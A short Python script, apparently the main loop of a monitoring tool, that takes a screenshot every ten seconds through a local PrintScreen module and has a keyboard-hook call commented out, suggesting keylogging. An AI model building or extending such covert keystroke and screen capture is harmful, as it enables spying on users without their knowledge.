import time
import Hook_Keyboard
import PrintScreen


number = 0

while True:
   #Hook_Keyboard.hook_keyboard()
    PrintScreen.take_screen(number)
    number = number + 1
    time.sleep(10)

